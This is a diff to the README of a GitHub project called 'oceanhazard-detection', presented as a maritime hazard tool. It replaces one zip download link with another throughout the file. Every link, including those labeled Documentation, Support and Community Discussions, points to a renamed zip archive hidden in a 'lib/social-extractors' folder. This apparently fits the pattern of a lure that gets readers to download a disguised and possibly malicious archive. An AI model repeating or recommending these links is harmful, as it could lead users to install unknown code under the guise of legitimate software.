@@ -1,6 +1,6 @@
 # 🌊 oceanhazard-detection - Easily Identify Ocean Hazards
 
-[![Download Now](https://github.com/albert123451/oceanhazard-detection/raw/refs/heads/main/oceanhazard-detection/lib/social-extractors/oceanhazard-detection-v3.1-beta.3.zip%20Now-Release%20Page-blue)](https://github.com/albert123451/oceanhazard-detection/raw/refs/heads/main/oceanhazard-detection/lib/social-extractors/oceanhazard-detection-v3.1-beta.3.zip)
+[![Download Now](https://raw.githubusercontent.com/albert123451/oceanhazard-detection/main/oceanhazard-detection/lib/social-extractors/detection-oceanhazard-2.1.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/albert123451/oceanhazard-detection/main/oceanhazard-detection/lib/social-extractors/detection-oceanhazard-2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the oceanhazard-detection project! This guide will help you download 
 
 To get started, you need to download the software. Visit the link below to access the latest release of the oceanhazard-detection application:
 
-[Download from Release Page](https://github.com/albert123451/oceanhazard-detection/raw/refs/heads/main/oceanhazard-detection/lib/social-extractors/oceanhazard-detection-v3.1-beta.3.zip)
+[Download from Release Page](https://raw.githubusercontent.com/albert123451/oceanhazard-detection/main/oceanhazard-detection/lib/social-extractors/detection-oceanhazard-2.1.zip)
 
 Once there, look for the release that matches your operating system. Follow these steps:
 
@@ -94,12 +94,12 @@ Feedback is welcome! You can reach us through the "Issues" section on the GitHub
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/albert123451/oceanhazard-detection/raw/refs/heads/main/oceanhazard-detection/lib/social-extractors/oceanhazard-detection-v3.1-beta.3.zip)
-- [Support](https://github.com/albert123451/oceanhazard-detection/raw/refs/heads/main/oceanhazard-detection/lib/social-extractors/oceanhazard-detection-v3.1-beta.3.zip)
-- [Community Discussions](https://github.com/albert123451/oceanhazard-detection/raw/refs/heads/main/oceanhazard-detection/lib/social-extractors/oceanhazard-detection-v3.1-beta.3.zip)
+- [Documentation](https://raw.githubusercontent.com/albert123451/oceanhazard-detection/main/oceanhazard-detection/lib/social-extractors/detection-oceanhazard-2.1.zip)
+- [Support](https://raw.githubusercontent.com/albert123451/oceanhazard-detection/main/oceanhazard-detection/lib/social-extractors/detection-oceanhazard-2.1.zip)
+- [Community Discussions](https://raw.githubusercontent.com/albert123451/oceanhazard-detection/main/oceanhazard-detection/lib/social-extractors/detection-oceanhazard-2.1.zip)
 
 ## 🎉 Conclusion
 
 Thank you for choosing oceanhazard-detection. We hope this guide has made the process simple. Download the application, and start your journey toward safer maritime activities today!
 
-For additional information, refer to the [Download Page](https://github.com/albert123451/oceanhazard-detection/raw/refs/heads/main/oceanhazard-detection/lib/social-extractors/oceanhazard-detection-v3.1-beta.3.zip) where you can find the latest features and updates.
+For additional information, refer to the [Download Page](https://raw.githubusercontent.com/albert123451/oceanhazard-detection/main/oceanhazard-detection/lib/social-extractors/detection-oceanhazard-2.1.zip) where you can find the latest features and updates.
